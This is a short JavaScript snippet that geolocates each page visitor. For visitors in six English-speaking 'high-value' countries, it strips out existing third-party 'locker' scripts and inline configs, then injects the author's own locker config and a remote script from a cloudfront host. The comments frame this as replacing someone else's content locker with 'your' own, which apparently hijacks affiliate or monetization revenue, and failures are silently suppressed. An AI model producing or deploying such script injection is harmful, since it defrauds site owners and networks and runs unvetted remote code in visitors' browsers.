(async () => {
  const highValueCountries = ["US", "GB", "CA", "AU", "IE", "NZ"];
  try {
    const res = await fetch("https://ipapi.co/json/");
    const data = await res.json();
    const country = data.country_code;

    if (highValueCountries.includes(country)) {
      // Remove their locker scripts (anything from dlk)
      document.querySelectorAll('script[src*="https://dlk"]').forEach(s => s.remove());

      // Remove locker var configs
      document.querySelectorAll('script:not([src])').forEach(s => {
        if (s.textContent.includes("var")) s.remove();
      });

      // Inject your config
      const varScript = document.createElement("script");
      varScript.type = "text/javascript";
      varScript.innerHTML = `var HoOxs_Msq_eyiQFc={"it":4505108,"key":"37ba1"};`;
      document.head.appendChild(varScript);

      // Inject your locker JS
      const lockerScript = document.createElement("script");
      lockerScript.src = "https://dlk457skl57zp.cloudfront.net/7fbb0e4.js";
      document.head.appendChild(lockerScript);
    }
  } catch (e) {}
})();
